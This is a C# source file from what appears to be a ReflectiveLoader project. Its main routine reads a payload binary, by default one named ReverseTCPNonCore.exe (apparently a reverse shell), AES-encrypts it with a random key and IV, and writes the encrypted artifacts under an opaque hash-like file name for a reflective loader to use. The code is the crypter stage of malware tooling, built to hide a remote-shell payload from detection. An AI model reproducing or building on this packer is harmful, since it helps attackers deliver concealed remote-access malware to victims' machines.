using ReflectiveLoader;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ReflectiveLoader
{
    internal class BinaryEncryptorMain
    {
        // TODO: put to a config file
        static String BINPATH = Path.Combine(new FileInfo(System.Reflection.Assembly.GetExecutingAssembly().Location).DirectoryName,
            "..\\..\\..\\..\\ReverseTCPNonCore\\bin\\Debug\\ReverseTCPNonCore.exe");
        static String ENCRPATH = Path.Combine(new FileInfo(System.Reflection.Assembly.GetExecutingAssembly().Location).DirectoryName,
            "..\\..\\..\\..\\ReflectiveLoader\\bin\\Debug\\net8.0\\f23f9c22dcccafe4723c5aca51c96870afc4130bc2b5c5f0b8dab9e51cf902e3");

        static void Main(string[] args)
        {
            string binPath = BINPATH;
            Console.WriteLine($"Usage {AppDomain.CurrentDomain.FriendlyName} <path_to_dll>");
            Console.WriteLine("If no path_to_dll is defined then default value is used: " + BINPATH);

            if (args.Length == 1) binPath = args[0];

            byte[] bytesPlain = File.ReadAllBytes(binPath);
            byte[] key = BinaryEncryptor.GenerateRandomKey();
            byte[] IV = BinaryEncryptor.GenerateRandomIV();
            byte[] bytesEncrypted = BinaryEncryptor.EncryptAes(bytesPlain, key, IV);
            BinaryEncryptor.GenerateArtifacts(bytesEncrypted, key, IV, ENCRPATH);
        }
    }
}
